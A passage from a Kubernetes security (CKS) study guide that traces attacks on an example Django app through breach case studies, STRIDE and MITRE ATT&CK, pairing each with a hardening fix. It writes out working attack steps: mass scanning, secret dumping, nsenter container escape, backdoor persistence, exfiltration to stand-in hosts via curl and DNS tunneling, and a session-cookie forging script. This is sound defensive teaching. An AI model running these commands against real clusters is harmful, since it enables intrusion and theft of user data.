  │  🧠 API SERVER  (port 6443)                         │
  │  ← Attack Vector 2: Weak RBAC / stolen credentials │ → Ch 9
  └────────────────────┬───────────────────────────────┘
                       │
       ┌───────────────▼────────────────┐
       │  ☸️ PODS running on workers      │
       │  ← Vector 3: Root containers    │ → Ch 14, 15, 18
       │  ← Vector 4: Vulnerable images  │ → Ch 23
       │  ← Vector 5: Mounted secrets    │ → Ch 19, 20
       │                                 │
       │  compromised pod →              │
       │    steal ServiceAccount token   │ → Ch 10
       │    → lateral movement           │ → Ch 6
       │    → reach other pods/secrets   │ → Ch 6, 19
       └─────────────────────────────────┘

  ← Vector 6: Malicious images from registry → Ch 24, 26
  ← Vector 7: Supply chain compromise → Ch 25, 27

How Attackers Actually Execute Each Vector — Technical Breakdown

Understanding the theory is not enough. Here's exactly what commands attackers run, what they look for, and how each attack succeeds on a default cluster:

Vector 1 — Exposed API Server: The Attacker's Playbook
  # Step 1: Attacker scans for open K8s API ports
  $ shodan search 'product:"kubernetes"' --fields ip_str,port
  $ masscan -p6443 0.0.0.0/0 --rate=10000

  # Step 2: If --anonymous-auth=true (DEFAULT!):
  $ curl -k https://TARGET_IP:6443/api/v1/namespaces
  → Returns ALL namespaces. No credentials needed.

  # Step 3: Extract everything
  $ kubectl --server=https://TARGET_IP:6443 --insecure-skip-tls-verify \
      get pods --all-namespaces
  $ kubectl --server=https://TARGET_IP:6443 --insecure-skip-tls-verify \
      get secrets --all-namespaces
  → Every database password, API key, and TLS cert is now visible.

  # This is EXACTLY what happened to Tesla in 2018.
Vector 3 — Root Container Exploitation: What Root Actually Means
  # Default container (NO securityContext)
  $ kubectl exec -it anihpj-pod -- id
  uid=0(root) gid=0(root) groups=0(root)
  → Container runs as ROOT. Full privileges inside the container.

  # Attacker exploits CVE in Pillow library → gains shell as root
  $ whoami
  root

  # From root inside container:
  $ cat /proc/1/environ | tr '\0' '\n'  # Read ALL environment variables
  $ mount | grep hostPath               # Find host filesystem mounts
  $ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
  → Container escape! Now you're root on the NODE.

  # From node root:
  $ docker ps                           # See ALL containers on this node
  $ crictl ps                           # See ALL containers via CRI
  $ cat /etc/kubernetes/manifests/kube-apiserver.yaml
  → Control plane manifests visible. Cluster completely compromised.

  # CKS FIX: SecurityContext (Ch 18) + Seccomp (Ch 15) + AppArmor (Ch 14)
Vector 6 — Lateral Movement: The Flat Network Problem
  # Attacker compromises anihpj pod. Now they scan the internal network:
  $ for ip in 10.0.0.{1..254}; do nc -zv $ip 5432 2>&1 | grep succeeded; done
  → Found postgres at 10.0.1.45:5432!

  $ for ip in 10.0.0.{1..254}; do nc -zv $ip 6379 2>&1 | grep succeeded; done
  → Found redis at 10.0.2.12:6379!

  # Attacker now has:
  # - Direct access to your production database
  # - Direct access to your session cache
  # - Can reach pods in OTHER namespaces (kube-system, monitoring, etc.)
  # - Zero barriers. The network is completely flat.

  # CKS FIX: Default-deny NetworkPolicy (Ch 6) blocks ALL of this.
  # With NetworkPolicy: nc to postgres → connection REFUSED.
⚠️ The Root Cause of EVERY Default K8s Attack

Notice the pattern: Every single attack above succeeds because Kubernetes ships with security features OFF by default. Anonymous auth: ON. Root containers: YES. Flat network: YES. Plaintext secrets: YES. No audit: YES. The CKS exam is not testing advanced security concepts — it's testing whether you know which defaults to turn OFF and how to configure the secure alternatives. Every question is essentially: "The default is insecure. Fix it."

Is Your Cluster Vulnerable? — CKS Decision Tree

This decision tree is a diagnostic tool. Walk through each question and answer honestly about your current cluster (or the anihpj cluster you plan to deploy). Every "Yes" answer means there is a concrete, exploitable vulnerability that the CKS exam expects you to know how to fix. Every "No" means you have already applied that layer of hardening — but don't stop until you reach the final green node.

The tree is ordered by attack criticality — the questions at the top represent the most common and most damaging vulnerabilities. If you answer "Yes" to the first question (anonymous auth enabled), stop everything and fix that first. It is the equivalent of leaving your front door wide open with a sign that says "valuables inside." Only after closing the most critical gaps should you move to the lower-priority items. This prioritization mirrors exactly how the CKS exam weights its domains: Cluster Setup (15%) and Cluster Hardening (15%) address the top three questions, while the remaining domains cover the lower branches.

🧠 Is anonymous-auth enabled on the API server?
✅ YES — Anyone can access your cluster! Fix: Chapter 8 (disable anonymous auth) → RBAC (Ch 9)
✅ NO — Good. Move to next check.
📦 Do your containers run as root (uid 0)?
✅ YES — Root escape risk! Fix: SecurityContext runAsNonRoot (Ch 18) + Seccomp (Ch 15) + AppArmor (Ch 14)
✅ NO — Good. Move to next check.
🌐 Is there no default-deny NetworkPolicy?
✅ YES — Flat network = lateral movement risk! Fix: NetworkPolicy (Ch 6)
✅ NO — Good. Move to next check.
🔐 Are etcd secrets stored without encryption?
✅ YES — Secrets are plaintext! Fix: EncryptionConfiguration (Ch 19)
✅ NO — Good. Move to next check.
📝 Is audit logging disabled (the default)?
✅ YES — No traceability! Fix: Audit Policy (Ch 28) + Falco (Ch 29)
🎉 NO — Your cluster has basic hardening. Now add Falco (Ch 29), image scanning (Ch 23), and supply chain controls (Ch 25-27).

How to interpret your results: Count your "Yes" answers. Each one is an exploitable vulnerability. The CKS exam is structured so that these five questions map almost directly to the five domains of the exam syllabus. Anonymous auth → Domain 2 (Cluster Setup). Root containers → Domain 4 (System Hardening). Flat network → Domain 5 (Minimize Microservice Vulnerabilities). Plaintext secrets → Domain 5. No audit logging → Domain 7 (Monitoring & Runtime Security). If you answered "Yes" to three or more questions, your cluster would fail a basic penetration test. If you answered "Yes" to all five, your cluster is effectively undefended — every breach described in this chapter could happen to you. The rest of this guide (Chapters 4-32) walks you through fixing every single "Yes" systematically.

2.2 Real-World Kubernetes Security Incidents

These are not hypothetical scenarios. Each of these attacks actually happened — and each one exploited a default K8s configuration that the CKS curriculum teaches you to fix.

4 Real Breach Cards — Timeline, Attack Path, Lesson, CKS Fix

🚗
TESLA — 2018 — Exposed Dashboard → Crypto-Mining

Attack: Kubernetes Dashboard exposed publicly with no authentication. Path: Internet → Dashboard (admin role) → create crypto-mining pod → use AWS credentials found in cluster environment variables. Impact: Compute hijacked for crypto-mining, AWS data at risk. CKS Fix: Ch 5 (secure dashboard) + Ch 9 (RBAC) + Ch 19 (Secrets).

🏦
CAPITAL ONE — 2019 — SSRF → IAM Role → S3 Breach

Attack: SSRF vulnerability in WAF allowed access to EC2 metadata API from a pod. Path: App pod → cloud metadata API (169.254.169.254) → IAM role credentials → S3 list → download 106M customer records. Impact: $80M fine, largest US financial data breach. CKS Fix: Ch 13 (block metadata API) + Ch 16 (restrict IAM roles).

🛍️
SHOPIFY — 2020 — Rogue Employee → Lateral Movement

Attack: Internal employee with pod access used kubectl exec to move laterally. Path: Internal access → kubectl exec into pod → lateral movement across namespaces → read merchant transaction data. Impact: 200 merchants' data exposed, regulatory investigation. CKS Fix: Ch 6 (NetworkPolicy) + Ch 9 (RBAC) + Ch 28 (Audit logs).

🔗
SOLARWINDS — 2020 — Supply Chain → Malicious Signed Updates

Attack: Build system compromised → malicious code injected into legitimate software. Path: Attacker in CI/CD → modified build pipeline → signed update with backdoor → 18,000 organizations ran trojanized software. Impact: US government agencies breached via trusted software. CKS Fix: Ch 25 (static analysis) + Ch 26 (cosign) + Ch 27 (SLSA).

Tesla Breach 2018 — Step-by-Step Walkthrough

The exact sequence that led to one of the most famous K8s breaches
  🔍 TESLA BREACH 2018 — Step by Step

  1. 🌐 Attacker scans internet for open Kubernetes ports
     → Uses Shodan/Masscan to find port 6443 (API) or 8001 (Dashboard)

  2. 🎯 Finds Tesla's Kubernetes Dashboard exposed (no password)
     → Dashboard accessible — no authentication required

  3. 🔑 Dashboard had admin-level cluster privileges
     → Attacker can create/delete pods, read secrets, deploy workloads

  4. 📦 Attacker deploys crypto-mining containers
     → Uses Tesla's GPU instances to mine cryptocurrency

  5. 🔒 AWS credentials found in cluster environment variables
     → Attacker extracts IAM credentials from pod env vars → S3 access

  💡 LESSONS:
     ✅ NEVER expose dashboard without authentication (Ch 5)
     ✅ Use NetworkPolicy to restrict dashboard access (Ch 6)
     ✅ NEVER give service accounts admin permissions (Ch 9, 10)
     ✅ Rotate and restrict cloud provider credentials (Ch 16)
     ✅ Enable audit logging — you'd know who did what (Ch 28)

Capital One SSRF — The Full Technical Deep Dive

🔴 This is the most important breach to understand for CKS — it combined misconfigured cloud metadata, excessive IAM permissions, and container escape
Capital One 2019: Attack Chain Deconstructed
1
Server-Side Request Forgery (SSRF)

Capital One used a WAF (ModSecurity) in front of a web application running on EC2. A misconfigured ModSecurity rule allowed an attacker to redirect the WAF's internal HTTP request to a target they controlled.

The WAF's internal proxy fetched:
http://169.254.169.254/latest/meta-data/

→ The EC2 Instance Metadata Service! This endpoint returns everything about the EC2 instance, including temporary IAM credentials.

⚠️ WHY THIS MATTERS FOR KUBERNETES: Every pod on an EC2-based K8s node can reach 169.254.169.254 by default. If any pod has an SSRF vulnerability, and the node has an IAM role attached, the attacker can steal those credentials just like Capital One.
2
IAM Role Credential Theft
Step 2a — Discover the role name:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ Returns: "anihpj-s3-read-role"
Step 2b — Retrieve temporary credentials:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/anihpj-s3-read-role
→ Returns:
{
  "AccessKeyId": "AKIAXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY",
  "Token": "...",
  "Expiration": "2024-01-01T00:00:00Z"
}

These are REAL AWS credentials. The attacker now has whatever permissions the IAM role had. In Capital One's case: s3:ListBucket and s3:GetObject.

3
Data Exfiltration
Shell commands executed by the attacker:
$ aws s3 ls s3://capitalone-customer-data --profile stolen-creds
$ aws s3 sync s3://capitalone-customer-data ./stolen-data --profile stolen-creds

→ 106 million customer records downloaded.

4
The K8s-Specific Twist

After the SSRF, the attacker used the stolen credentials to:

  • List EKS clusters in the account
  • Discover Kubernetes clusters running workloads with similar IAM roles
  • Potentially access pod logs containing sensitive data

CKS FIXES for Every Layer

🔒
Layer 1

Metadata concealment — iptables rule to DROP traffic to 169.254.169.254 from pods.

Ch 13
🛡️
Layer 2

AppArmor/SELinux — prevent pods from making outbound network calls to metadata IP.

Ch 14
🔑
Layer 3

IRSA (IAM Roles for Service Accounts) instead of node-level IAM roles — each pod gets only the permissions it needs.

Ch 19
🌐
Layer 4

NetworkPolicy — egress rules blocking 169.254.169.254 from all pods except trusted ones.

Ch 9
📋
Layer 5

Audit logging — detect abnormal access patterns to metadata endpoints.

Ch 28
💸 COST: $80 million FTC fine + $190 million settlement = $270 million total. 106 million customer records exposed.
🎯 ROOT CAUSE: Trusted the pod's network access. Never trust pods. A single iptables rule or NetworkPolicy blocking 169.254.169.254 would have prevented a $270 million breach.

Breach Financial Impact — What These Attacks Actually Cost

The numbers below are not hypothetical. They represent actual fines, settlements, remediation costs, and business losses from the four breaches analyzed in this chapter. Understanding the financial scale makes the CKS investment — both the exam cost and the engineering effort to harden clusters — self-evidently worthwhile.

Capital One ($270M): The $80M FTC fine was for failing to implement basic security controls that could have prevented the SSRF attack. The additional $190M class-action settlement covered 98 million affected customers. The root cause — an SSRF vulnerability in a WAF that allowed access to the EC2 metadata service — is exactly the type of cloud-metadata exposure that Chapter 13 teaches you to block with a simple iptables rule or NetworkPolicy. A single iptables rule would have prevented a $270 million breach.

SolarWinds ($100B+ estimated): The most expensive software supply chain attack in history. 18,000 organizations — including the US Treasury, Department of Homeland Security, and Fortune 500 companies — ran trojanized software for months. The CKS supply chain chapters (25-27) teach you exactly the controls that detect and prevent this: SBOM generation to know what's in your software, static analysis to catch malicious patterns before build, and cosign signing so you can cryptographically verify that the image you deploy is the image you built.

💰 Capital One — FTC Fine + Settlement $270M total · 106M records
🔗 SolarWinds — Estimated Total Impact $100B+ across 18,000 orgs
🚗 Tesla — Crypto-Mining Compute Theft $100K+ in stolen compute
🛍️ Shopify — Regulatory + Data Exposure 200 merchants · investigation cost
🛡️ Average Cost of K8s Security Breach (IBM 2024) $4.88M per breach

SolarWinds Supply Chain — Why Image Signing Matters

🔴 The Attack Chain
1 Attacker compromises SolarWinds build server (the CI/CD pipeline itself)
2 Malicious code injected into Orion software at BUILD TIME — before any signature
3 SolarWinds signs the already-compromised binary and ships to 18,000 customers
4 All 18,000 organizations run the trojanized software believing it's "trusted"
5 Backdoor phones home, attackers selectively target US government agencies
🟢 The CKS Supply Chain Fix
1 Every build produces an SBOM (Software Bill of Materials) — Ch 24
2 Static analysis scans code BEFORE build — kubesec, conftest, OPA — Ch 25
3 Image signed with cosign AFTER verification — Ch 26
4 Admission controller (OPA/Gatekeeper) BLOCKS unsigned images — Ch 26
5 SLSA provenance proves the build chain was not tampered with — Ch 27

2.3 Kubernetes Security Threat Model (STRIDE)

STRIDE is a threat modeling framework developed by Microsoft that categorizes security threats into six types. When applied to Kubernetes, it provides a systematic way to identify and mitigate every category of risk.

📖 What is STRIDE?

Spoofing · Tampering · Repudiation · Information Disclosure · Denial of Service · Elevation of Privilege. Every security threat falls into one of these six categories. For each, we identify the K8s-specific attack, the impact on anihpj, and the CKS control that mitigates it.

STRIDE × CKS Coverage Matrix

ThreatWhat It MeansK8s Attack ExampleImpact on anihpjCKS Mitigation
SpoofingImpersonating user/serviceFake ServiceAccount token, stolen kubeconfigAttacker acts as anihpj pod, queries DBRBAC (Ch 9), Bound SA tokens (Ch 10), mTLS (Ch 22)
TamperingModifying data/configsModify etcd, alter pod specs, inject ConfigMapAttacker changes anihpj Deployment to malicious imageetcd encryption (Ch 19), RBAC (Ch 9), image signing (Ch 26)
RepudiationActions without audit trailsNo audit logging → attacker denies actionsAttacker deletes jobpost data; no proof of who or whenAudit logging (Ch 28), Falco (Ch 29)
Info DisclosureSecrets or data leakedSecrets in plaintext env vars, unencrypted etcdUser emails, DB passwords, SECRET_KEY exposedEncryption at rest (Ch 19), Vault (Ch 20)
Denial of ServiceResource exhaustionUnlimited CPU/memory, fork bombs, disk exhaustionAttacker crashes anihpj pods → listings unavailableResourceQuota, LimitRange (Ch 15), PSS (Ch 17)
Elevation of PrivGaining more permissionsRoot container → node escape, hostPath mount, privileged podAttacker escapes anihpj container → compromises nodeNon-root (Ch 18), Seccomp (Ch 15), AppArmor (Ch 14)

STRIDE Applied to anihpj: Code-Level Threat Walkthrough

Let's walk through each STRIDE category with REAL code examples from the anihpj/jobpost Django app. This is what the attacker sees and exploits:

Spoofing: How an Attacker Impersonates the anihpj ServiceAccount
  # DEFAULT anihpj pod (no security hardening):
  $ kubectl run anihpj --image=anihpj:latest

  # The pod gets a ServiceAccount token mounted automatically:
  $ kubectl exec -it anihpj -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
  eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9...  ← THIS IS A JWT WITH CLUSTER PERMISSIONS

  # Decode it:
  $ echo "eyJhbGciOi..." | cut -d'.' -f2 | base64 -d | python -m json.tool
  {
    "iss": "kubernetes/serviceaccount",
    "kubernetes.io/serviceaccount/namespace": "default",
    "kubernetes.io/serviceaccount/secret.name": "anihpj-token-xxxxx",
    "kubernetes.io/serviceaccount/service-account.name": "default",
    "sub": "system:serviceaccount:default:default"
  }

  # If 'default' SA has cluster-admin:
  $ kubectl --token="eyJhbGciOi..." get secrets --all-namespaces
  → ALL secrets in the cluster. Database passwords. TLS keys. Everything.

  # THE FIX (Ch 10):
  # 1. automountServiceAccountToken: false (if pod doesn't need API access)
  # 2. Create dedicated SA with minimal RBAC
  # 3. Use projected tokens with expiration (--service-account-token-volume-projection)
Tampering: Modifying the anihpj Deployment in Transit
  # Scenario: Attacker gains kubectl access with patch permissions

  # Step 1: Get current deployment
  $ kubectl get deploy anihpj -o yaml > anihpj-original.yaml

  # Step 2: Attacker modifies the image to a backdoored version
  $ kubectl patch deploy anihpj -p '{
      "spec": {
        "template": {
          "spec": {
            "containers": [{
              "name": "anihpj",
              "image": "evil-registry.io/anihpj-backdoored:v1"
            }]
          }
        }
      }
    }'

  # Step 3: K8s rolls out the malicious image. Now the attacker:
  #   - Has a reverse shell back to their C2 server
  #   - Can read DJANGO_SECRET_KEY from env vars
  #   - Can access DATABASE_URL from ConfigMap → dump all user data

  # THE FIX (Ch 25+26):
  # Admission controller rejects images NOT from allowed registries:
  # OPA policy: input.review.object.spec.containers[_].image =~ "anihpj-registry.io/*"
  # Anything else → BLOCKED.
Repudiation: Attacker Deletes Evidence — No Audit Trail
  # Scenario: Attacker compromises anihpj pod, steals data, wants to cover tracks

  # Without audit logging (DEFAULT!):
  $ kubectl delete pod anihpj-7d4f8b9c-x2k3m
  → Pod is gone. Logs are gone. Who deleted it? No record. When? No record.

  # With audit logging ENABLED (Ch 28):
  # The API server writes to /var/log/kubernetes/audit.log:
  {
    "kind": "Event",
    "apiVersion": "audit.k8s.io/v1",
    "level": "RequestResponse",
    "stage": "ResponseComplete",
    "requestURI": "/api/v1/namespaces/default/pods/anihpj-7d4f8b9c-x2k3m",
    "verb": "delete",
    "user": {
      "username": "attacker@evil.com",
      "groups": ["system:authenticated"]
    },
    "sourceIPs": ["203.0.113.42"],
    "objectRef": {
      "resource": "pods",
      "name": "anihpj-7d4f8b9c-x2k3m",
      "namespace": "default"
    },
    "responseStatus": {
      "code": 200
    },
    "requestReceivedTimestamp": "2024-06-15T03:22:47.123456Z"
  }

  → Audit log proves: WHO (attacker@evil.com), WHAT (delete pod), WHEN (timestamp),
    WHERE (source IP), RESULT (200 = success). Repudiation: DEFEATED.

  # CKS Exam: You must know the audit policy levels:
  # None → Metadata → Request → RequestResponse
  # RequestResponse captures the FULL request AND response body.
Information Disclosure: Secrets Leaked Through anihpj
  # The anihpj Django app uses these secrets:
  # settings.py:
  SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')      # Session signing
  DATABASE_URL = os.environ.get('DATABASE_URL')          # Postgres connection string
  EMAIL_HOST_PASSWORD = os.environ.get('EMAIL_HOST_PASSWORD')  # SMTP credentials

  # DEFAULT K8s: These are stored as env vars from a Secret:
  $ kubectl get secret anihpj-secrets -o yaml
  apiVersion: v1
  kind: Secret
  type: Opaque
  data:
    DJANGO_SECRET_KEY: dXNlci1zZWNyZXQta2V5LWZvci1zZXNzaW9ucw==
    DATABASE_URL: cG9zdGdyZXM6Ly91c2VyOnBhc3N3b3JkQGRiOjU0MzIvam9icG9zdA==
    EMAIL_HOST_PASSWORD: c210cC1wYXNzd29yZC0xMjM0NQ==

  # "But it's base64 encoded!" — NO. Base64 is ENCODING, not encryption.
  $ echo "dXNlci1zZWNyZXQta2V5LWZvci1zZXNzaW9ucw==" | base64 -d
  user-secret-key-for-sessions   ← Plaintext! In 1 second!

  # ANYONE with 'get secrets' RBAC can decode ALL secrets.
  # ANY pod that mounts this Secret can read ALL values.

  # THE FIX (Ch 19, 20):
  # 1. Encrypt Secrets at rest in etcd (EncryptionConfiguration)
  # 2. Use external KMS (Vault, AWS KMS, Azure Key Vault) — Ch 20
  # 3. Use CSI driver to mount secrets as tmpfs (never on disk)

MITRE ATT&CK × anihpj: Tracing an Attack Through All 10 Tactics

The MITRE ATT&CK framework isn't just a table — it's a narrative. Here's exactly how an attacker progresses through all 10 tactics against anihpj, and where each CKS defense stops them cold:

Tactic 1–3: Break In, Run Code, Stay Hidden
  [1] INITIAL ACCESS — "How do they get in?"
  ──────────────────────────────────────────
  Attacker finds anihpj Dashboard at https://dashboard.anihpj.com:8443
  No authentication → instant cluster access.
  ⛔ STOPPED BY: --anonymous-auth=false (Ch 8) + Dashboard OIDC auth (Ch 5)

  [2] EXECUTION — "What do they run first?"
  ─────────────────────────────────────────
  kubectl run backdoor --image=evil/malware --restart=Never
  → Pod runs with ALL default privileges (root, host network, etc.)
  ⛔ STOPPED BY: OPA/Gatekeeper admission (Ch 24) + PodSecurity Restricted (Ch 17)

  [3] PERSISTENCE — "How do they stay in?"
  ────────────────────────────────────────
  kubectl create serviceaccount backdoor-sa -n kube-system
  kubectl create clusterrolebinding backdoor-admin \
      --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor-sa
  → Permanent cluster-admin access, even if original pod is deleted.
  ⛔ STOPPED BY: RBAC restrictions (Ch 9) + Audit logging alert (Ch 28)
Tactic 4–7: Escalate, Evade, Steal Creds, Discover
  [4] PRIVILEGE ESCALATION — "How do they go from pod to node?"
  ─────────────────────────────────────────────────────────────
  Attacker's anihpj pod runs as root + has hostPath /host mount.
  nsenter --target 1 --mount --uts --ipc --net --pid -- bash
  → Now running as root on the WORKER NODE.
  ⛔ STOPPED BY: runAsNonRoot (Ch 18) + no hostPath (Ch 17) + Seccomp (Ch 15)

  [5] DEFENSE EVASION — "How do they hide?"
  ─────────────────────────────────────────
  Attacker edits /etc/kubernetes/manifests/kube-apiserver.yaml
  → Removes --audit-log-path flag → audit logging DISABLED at next restart.
  ⛔ STOPPED BY: readOnlyRootFS (Ch 18) prevents editing any files

  [6] CREDENTIAL ACCESS — "How do they steal keys?"
  ─────────────────────────────────────────────────
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
  → SA token gives API access. Then: kubectl get secrets -A.
  → All database passwords, API keys, TLS certs extracted.
  ⛔ STOPPED BY: automountSAToken: false (Ch 10) + IRSA (Ch 19)

  [7] DISCOVERY — "What do they learn about your cluster?"
  ────────────────────────────────────────────────────────
  kubectl get pods -o wide --all-namespaces
  kubectl get nodes -o wide
  kubectl get services --all-namespaces
  → Complete map of your infrastructure: every pod, node, service.
  ⛔ STOPPED BY: Minimal RBAC — attacker's SA can only see its own namespace (Ch 9)
Tactic 8–10: Move Sideways, Collect Data, Get It Out
  [8] LATERAL MOVEMENT — "How do they reach your database?"
  ─────────────────────────────────────────────────────────
  # From compromised anihpj pod, attacker reaches postgres directly:
  $ psql -h postgres.default.svc.cluster.local -U anihpj_user -d jobpost

  # Without NetworkPolicy, there are ZERO barriers between pods.
  # The anihpj pod can also reach:
  #   - redis (session cache — forge sessions)
  #   - elasticsearch (logs — find more secrets)
  #   - monitoring stack (learn cluster topology)
  ⛔ STOPPED BY: Default-deny NetworkPolicy (Ch 6) blocks all cross-pod traffic

  [9] COLLECTION — "What data do they gather?"
  ────────────────────────────────────────────
  # Dump all data from the database
  $ pg_dump -h postgres -U anihpj_user jobpost > all_users.sql
  # Read all secrets from etcd
  $ ETCDCTL_API=3 etcdctl get / --prefix --keys-only | \
      xargs -I {} etcdctl get {}
  → Complete cluster state + all user data collected.
  ⛔ STOPPED BY: Encryption at rest (Ch 19) + etcd mutual TLS (Ch 8)

  [10] EXFILTRATION — "How do they get the data OUT of your network?"
  ───────────────────────────────────────────────────────────────────
  # Method A: Direct HTTPS
  $ curl -X POST https://evil-server.exfil.com/upload --data-binary @all_users.sql

  # Method B: DNS tunneling (bypasses HTTP egress rules)
  $ cat all_users.sql | base64 | fold -w 63 | while read line; do
      nslookup $line.evil-dns.exfil.com
    done

  ⛔ STOPPED BY: NetworkPolicy egress rules (Ch 6) +
                 AppArmor network restrictions (Ch 14) +
                 Falco detecting unusual outbound connections (Ch 29)

Credential Theft Against anihpj — The Exact Attack Walkthrough

🔴 This is the most likely attack against an unhardened anihpj deployment — and the one the CKS exam expects you to prevent
Phase 1: Initial Compromise — Exposed Dashboard or API

An attacker finds your cluster. Here are three common methods — any one of them gives the attacker kubectl access:

A
Internet-Wide Scan — Shodan / Censys / Masscan

Attackers continuously scan the entire IPv4 address space looking for Kubernetes API servers on port 6443. An exposed API server appears in Shodan results within hours. Even if authentication is required, the attacker now knows your cluster exists and can begin targeted attacks against your authentication layer.

$ shodan search 'kubernetes' --fields ip_str,port,org
203.0.113.42  6443  "Your Company Cloud"
B
Exposed Dashboard — Misconfigured LoadBalancer / Ingress

The Kubernetes Dashboard is often deployed during initial cluster setup and forgotten. If exposed via a LoadBalancer service or Ingress without authentication, anyone who discovers the endpoint gets a graphical UI to your entire cluster. Worse: many dashboards use Skip login or a static Bearer Token that's easily brute-forced.

$ curl -s https://dashboard.anihpj.com:8443
→ Returns the Kubernetes Dashboard login page
C
Leaked kubeconfig — Public Git Repos / Pastebin / Slack

Developers accidentally commit ~/.kube/config to public repositories, paste it into Slack threads, or leave it in CI/CD logs. A single leaked kubeconfig with embedded client certificate + key gives the attacker authenticated kubectl access — no brute force, no exploit, just copy-paste.

$ git clone https://github.com/anihpj/infra
$ cd infra && cat README.md
# "kubectl config: copy this to ~/.kube/config"
# ...contains the full kubeconfig with embedded cert + token.
⚠️ ANY of these three methods gives the attacker kubectl access. No exploit code required — just discovery, misconfiguration, or human error.
Phase 2: Discovery — What Can the Attacker See?

Attacker now has kubectl access. First reconnaissance commands:

Check permission level:
$ kubectl auth can-i --list
Resources   Verbs
*.*         [*]           ← CLUSTER ADMIN. They can do anything.
Map the cluster — pods, IPs, nodes:
$ kubectl get pods -o wide
NAME                      READY   STATUS    IP            NODE
anihpj-7d4f8b9c-x2k3m    1/1     Running   10.0.1.23     worker-1
postgres-5c8d7f9a-x9k2m  1/1     Running   10.0.1.45     worker-2
redis-8f3d2c1b-m4n7p     1/1     Running   10.0.2.12     worker-1
Discover secrets by name:
$ kubectl get secrets
NAME                  TYPE     DATA
anihpj-secrets        Opaque   4      ← Database passwords, SECRET_KEY, etc.
default-token-xxxxx   SA      3      ← Default SA token
postgres-creds        Opaque   2      ← PostgreSQL username + password
Read ConfigMaps — app configuration exposed:
$ kubectl get configmaps
NAME               DATA
anihpj-config      3                 ← DATABASE_URL, DEBUG, ALLOWED_HOSTS
⏱️ In 3 commands, the attacker knows:
  • Every pod, its IP, and which node it's on
  • All secrets by name (can read them next)
  • All ConfigMaps with app configuration
Phase 3: Credential Extraction — The Payload

Step 1: Read the Secrets

Decode all secret data in one command:
$ kubectl get secret anihpj-secrets -o jsonpath='{.data}' | python -c \
    "import sys,json,base64; d=json.load(sys.stdin); \
     {print(k, base64.b64decode(v).decode()) for k,v in d.items()}"
Credentials exposed:
DJANGO_SECRET_KEY    → 'django-insecure-abc123def456ghi789...'
DATABASE_URL         → 'postgres://anihpj_user:SuperSecret123!@postgres:5432/jobpost'
EMAIL_HOST_PASSWORD  → 'smtp-password-2024!'
AWS_ACCESS_KEY_ID    → 'AKIAXXXXXXXXXXXX'
AWS_SECRET_ACCESS_KEY → 'wJalrXUtnFEMI/...EXAMPLEKEY'
🍪
Django SECRET_KEY

Can forge ANY user session cookie — become any logged-in user instantly.

🗄️
Database Credentials

Direct access to PostgreSQL — read every user record, every job post, every message.

📧
Email Credentials

Can send phishing emails AS your domain — SPF/DKIM will pass because it's your real SMTP server.

☁️
AWS Credentials

Access to S3, SQS, SNS, and more — lateral movement into your entire cloud infrastructure.

Step 2: Connect Directly to the Database

Shell into the compromised pod:
$ kubectl exec -it anihpj-7d4f8b9c-x2k3m -- bash
root@anihpj:/app# apt-get install -y postgresql-client
root@anihpj:/app# psql postgres://anihpj_user:SuperSecret123!@postgres:5432/jobpost
SQL — exfiltrate user data:
jobpost=# SELECT email FROM users LIMIT 5;
            email
─────────────────────────────
 john.smith@example.com
 jane.doe@bigcorp.com
 ceo@startupventures.com
 hiring@fortune500.com
 candidate123@gmail.com

jobpost=# SELECT COUNT(*) FROM users;
 count
───────
 45000   ← 45,000 user records. All exfiltrated in minutes.
Phase 4: Session Forgery — Become Any User

With the Django SECRET_KEY extracted in Phase 3, the attacker can cryptographically forge a valid session cookie for ANY user — including the admin:

Python — forge an admin session cookie:
import hmac, hashlib, json, base64

SECRET_KEY = b'django-insecure-abc123def456ghi789...'

# Forge a session for admin@anihpj.com
session_data = {
    '_auth_user_id': '1',           # Admin user ID
    '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
    '_auth_user_hash': hashlib.sha256(b'admin').hexdigest()
}

encoded = base64.b64encode(json.dumps(session_data).encode()).decode()
signature = hmac.new(SECRET_KEY, encoded.encode(), hashlib.sha256).hexdigest()
forged_cookie = f"{encoded}:{signature}"

print(f"sessionid={forged_cookie}")
# → sessionid=eyJfYXV0aF91c2VyX2lkIjogIjEiLCAiX2F1dGhfdX...:abc123def456..."
Use the forged cookie to access the admin panel:
$ curl -H "Cookie: sessionid=eyJfYXV0aF91c2VyX2lkIjogIjEi..." https://anihpj.com/admin/
🚨 RESULT: Attacker is authenticated as ADMIN. Full Django admin panel access — can view ALL job posts, ALL users, change passwords, delete data.
💡 CKS Exam Insight: Every Secret You Don't Encrypt is a Weapon

This entire attack chain takes under 5 minutes on an unhardened cluster. The ONLY reason it works is because Kubernetes secrets are stored unencrypted in etcd by default. The CKS exam will test your ability to: (1) enable encryption at rest (EncryptionConfiguration), (2) restrict RBAC to secrets, (3) use external secret stores, and (4) implement NetworkPolicy so even compromised pods can't reach the database directly.

Container Escape Scenario — Attacker Breaks Out to the Node

From "root inside container" to "root on the node" — the most dangerous escalation in K8s
📦anihpj Pod
→
🔓Container Escape
→
💻Node Root
→
👑Cluster Admin
1
Attacker runs as root inside the anihpj container — DEFAULT behavior!

Without a securityContext, containers run as uid=0(root) by default. This is the single most dangerous Kubernetes default — and the one the CKS exam tests most heavily.

$ kubectl exec -it anihpj-7d4f8b9c-x2k3m -- id
uid=0(root) gid=0(root) groups=0(root)
→ CONFIRMED: Root inside container. Game on.
2
Check if host filesystem is mounted

The attacker checks for hostPath mounts — the most common misconfiguration that enables container escape. If the node's root filesystem is mounted inside the container, the attacker has a direct bridge to the host.

root@anihpj:/app# mount | grep -E '(hostPath|/host|node)'
/dev/sda1 on /host type ext4 (rw,relatime)
→ The NODE's root filesystem is mounted inside the container at /host!
3
Access the node's filesystem — find static pod manifests

With the node's filesystem exposed, the attacker immediately targets /etc/kubernetes/manifests/ — the directory kubelet watches for static pod definitions. Modifying these files gives the attacker control over the control plane itself.

Discover static pod manifests:
root@anihpj:/app# ls /host/etc/kubernetes/manifests/
